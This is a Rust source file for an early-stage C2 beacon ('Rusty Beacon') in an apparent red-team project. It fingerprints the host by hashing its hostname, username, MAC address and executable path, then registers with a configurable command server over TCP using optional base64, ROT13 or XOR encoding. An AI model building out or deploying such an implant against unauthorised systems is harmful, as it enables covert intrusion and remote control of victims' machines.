use clap::{Parser, ValueEnum};
use tracing::{info, debug, error};
use sysinfo::System;
use mac_address::get_mac_address;
use std::{env, fmt::Display};
use md5::{Md5, Digest};
use hex::encode;
use rot13::rot13;
use xor_cryptor::XORCryptor;
use base64::{engine::general_purpose, Engine as _};
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::time::Duration;

const VERSION: &str = env!("CARGO_PKG_VERSION");
const XOR_KEY: &str = "default_key";
const RECV_BUF_SIZE: usize = 4096;
const TIMEOUT_SECS: u64 = 30;
#[derive(Parser)]
#[command(version, about, long_about = format!("\t\t\t<3 Rusty Beacon version {} Ɛ>\r\nA reasonably simple rust implementation of a beacon for the BeaconatorC2 project.", VERSION))]
struct Args {
    #[arg(short = 'i', long = "ip_address", default_value = "127.0.0.1")]
    ip_address: String,

    #[arg(short = 'p', long = "port", default_value = "5074")]
    port: u16,

    #[arg(short = 'o', long = "obfuscation", value_enum, default_value = "plain-text")]
    obfuscation: ObfuscationStrategy,

    #[arg(short = 's', long = "schema_file", default_value = "rusty_beacon.yaml")]
    schema_file: String,

    #[arg(short = 'n', long = "interval", default_value = "15")]
    interval: u8,
}

#[derive(Debug, Clone, ValueEnum, Copy)]
pub enum ObfuscationStrategy {
    PlainText,
    Base64,
    Xor,
    Rot13,
}

impl Display for ObfuscationStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ObfuscationStrategy::PlainText => write!(f, "plain-text"),
            ObfuscationStrategy::Base64 => write!(f, "base64"),
            ObfuscationStrategy::Xor => write!(f, "xor"),
            ObfuscationStrategy::Rot13 => write!(f, "rot13"),
        }
    }
}

struct Config {
    beacon_id: String,
    ip_address: String,
    port: u16,
    obfuscation: ObfuscationStrategy,
    schema_file: String,
    interval: u8,
    jitter: u8,
}

fn main() {
    let args = Args::parse();
    let config = Config {
        beacon_id: generate_beacon_id(),
        ip_address: args.ip_address,
        port: args.port,
        obfuscation: ObfuscationStrategy::PlainText,
        schema_file: args.schema_file,
        interval: args.interval,
        jitter: 0,
    };

    tracing_subscriber::fmt::init();
    info!("[+] rusty_beacon version {} is alive", VERSION);
    info!(" |- Beacon Id:\t\t{}", config.beacon_id);
    info!(" |- Server IP:\t\t{}", config.ip_address);
    info!(" |- Server Port:\t{}", config.port);
    info!(" |- Encoding:\t\t{}", config.obfuscation);
    info!(" |- Schema File:\t{}", config.schema_file);
    info!(" |- Interval:\t\t{}", config.interval);
    info!(" |- Jitter:\t\t{}", config.jitter);

    let result = run(config);
    match result {
        Ok(_) => {
            info!("[+] rusty_beacon exited successfully");
        },
        Err(err) => {
            error!("[+] rusty_beacon exited with error: {}", err);
        }
    }
}

fn run(config: Config) -> std::io::Result<()> {
    info!("[+] polling loop started");
    if register(config) {
       info!("[+] rusty_beacon registered with C2");
    }
    Ok(())
}

fn register(config: Config) -> bool {
    let message = format!("register|{}|{}|{}", config.beacon_id, get_host_name(), config.schema_file);
    let response = send_tcp_message(&*message, config, true).unwrap_or_default();
    info!("[+] received registration response: {}", &response);
    true
}

fn generate_beacon_id() -> String {
    let mut system_info = format!("{}{}", get_host_name(), std::env::consts::OS);
    let username = std::env::var("USER").unwrap_or_default();
    system_info.push_str(&format!("{}", username));

    match get_mac_address() {
        Ok(mac) => system_info.push_str(&format!("{}", mac.unwrap_or_default())),
        Err(_) => system_info.push_str(&format!("{}", "unknown_mac")),
    }

    if let Ok(exe) = env::current_exe() {
        system_info.push_str(&exe.to_string_lossy());
    }

    debug!("system_info: {}", system_info);
    let mut hasher = Md5::new();
    hasher.update(system_info.as_bytes());
    let result = hasher.finalize();
    let hash = encode(result);

    hash
}

fn get_host_name() -> String {
    System::host_name().unwrap_or_else(|| "unknown_host".to_string())
}
fn send_tcp_message(message: &str, config: Config, expect_response: bool) -> std::io::Result<String> {
    let obfuscation_strategy = config.obfuscation;
    let obfuscated_message = obfuscate(message, obfuscation_strategy);

    let connection_string = format!("{}:{}", config.ip_address, config.port);
    let mut stream = TcpStream::connect(connection_string)?;

    //send
    stream.set_write_timeout(Some(Duration::from_secs(TIMEOUT_SECS)))?;
    stream.set_read_timeout(Some(Duration::from_secs(TIMEOUT_SECS)))?;

    stream.write_all(obfuscated_message.as_bytes())?; //already utf-8
    info!("[+] Sent message: {}", obfuscated_message);

    let mut buffer = [0; RECV_BUF_SIZE];
    let bytes_read = stream.read(&mut buffer)?;

    //optional recv
    if bytes_read == 0 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::UnexpectedEof,
            "Connection closed without data"
        ));
    }

    if expect_response {
        let response = String::from_utf8_lossy(&buffer[..bytes_read]);
        let deobfuscated = deobfuscate(&response, obfuscation_strategy);
        info!("[+] Unobfuscated message: {}", deobfuscated);
        return Ok(deobfuscated)
    }
    Ok(String::new())
}

fn obfuscate(message: &str, obfuscation_strategy: ObfuscationStrategy) -> String {
    match obfuscation_strategy {
        ObfuscationStrategy::PlainText => message.to_string(),
        ObfuscationStrategy::Base64 => general_purpose::STANDARD.encode(message),
        ObfuscationStrategy::Rot13 => rot13(message),
        ObfuscationStrategy::Xor => xor_encrypted(message),
    }
}

fn deobfuscate(encoded: &str, obfuscation_strategy: ObfuscationStrategy) -> String {
    match obfuscation_strategy {
        ObfuscationStrategy::PlainText => encoded.to_string(),
        ObfuscationStrategy::Base64 => {
            let bytes = general_purpose::STANDARD.decode(&encoded).unwrap_or_default();
            let decoded = std::str::from_utf8(&bytes).unwrap_or_default();
            decoded.to_string()
        },
        ObfuscationStrategy::Rot13 => rot13(encoded),
        ObfuscationStrategy::Xor => xor_decrypted(encoded),
    }
}

fn xor_encrypted(message: &str) -> String {
    let key = cycle_xor_key(message.len());
    let encrypted = match XORCryptor::encrypt_v2(key.as_bytes(), message.into()) {
        Ok(enc) => enc,
        Err(_) => return message.to_string(), //fallback to sending the cipher text
    };
    String::from_utf8_lossy(&encrypted).to_string()
}

fn xor_decrypted(encoded: &str) -> String {
   xor_encrypted(encoded) // xor cipher decrypt is the same operation as encrypt
}

fn cycle_xor_key(message_length: usize) -> String {
    XOR_KEY.repeat(message_length / XOR_KEY.len() + 1)[..message_length].to_string()
}
